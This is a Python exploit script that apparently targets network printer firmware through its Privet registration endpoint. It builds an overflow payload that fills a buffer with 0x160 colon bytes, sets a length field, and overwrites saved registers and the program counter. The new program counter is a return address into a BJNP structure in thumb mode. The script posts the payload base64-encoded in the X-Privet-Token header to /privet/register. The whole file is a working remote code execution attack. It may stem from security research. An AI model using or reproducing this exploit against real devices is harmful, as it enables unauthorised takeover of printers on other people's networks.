import base64
import struct
import http.client

import fw_version


class PrivetPayload:
    def __init__(self, version="10.02"):
        addresses = fw_version.get_address_dict(version)

        self.ret_addr = (
            addresses["bjnp_struct"]
            + 0x24      # Offset of the session data
            + 0x1       # Switch to thumb mode
        )

    @property
    def r4(self):
        return b"\x44\x44\x44\x44"

    @property
    def r5(self):
        return b"\x55\x55\x55\x55"

    @property
    def r6(self):
        return b"\x66\x66\x66\x66"

    @property
    def pc(self):
        return struct.pack("<I", self.ret_addr)

    def __bytes__(self):
        return (
            b":" * 0x160
            + struct.pack("<I", 0x20)  # pHashStrBufLen
            + self.r4
            + self.r5
            + self.r6
            + self.pc
        )


def execute_payload(target, payload, debug=False):
    headers = {
        "Content-type": "application/json",
        "Accept": "text/plain",
        "X-Privet-Token": base64.b64encode(bytes(payload)),
    }

    if debug:
        print("\n--\n")
        print(headers)

    conn = http.client.HTTPConnection(target, 80)
    conn.request("POST", "/privet/register", "", headers)

    if debug:
        res = conn.getresponse()
        print("\n--\n")
        print(res.status, res.reason)
        print(res.read())
